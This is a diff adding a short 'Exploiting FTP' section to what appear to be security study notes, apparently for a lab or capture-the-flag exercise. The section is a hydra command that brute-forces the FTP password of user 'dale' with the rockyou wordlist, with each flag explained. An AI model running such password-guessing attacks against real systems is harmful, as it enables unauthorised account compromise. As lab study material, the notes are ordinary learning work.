@@ -46,4 +46,14 @@ The FTP server may support either Active or Passive connections, or both.
 - In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it.   
 
 ### Exploiting FTP
+#### hydra
+`hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp`  
+`hydra` Runs the hydra tool  
+`-t 4`  Number of parallel connections per target    
+`-l [user]` Points to the user who's account you're trying to compromise  
+`-P [path to dictionary]`   Points to the file containing the list of possible passwords  
+`-vV`   Sets verbose mode to very verbose, shows the login+pass combination for each attempt  
+`[machine IP]`  The IP address of the target machine  
+`ftp / protocol`    Sets the protocol  
+
 
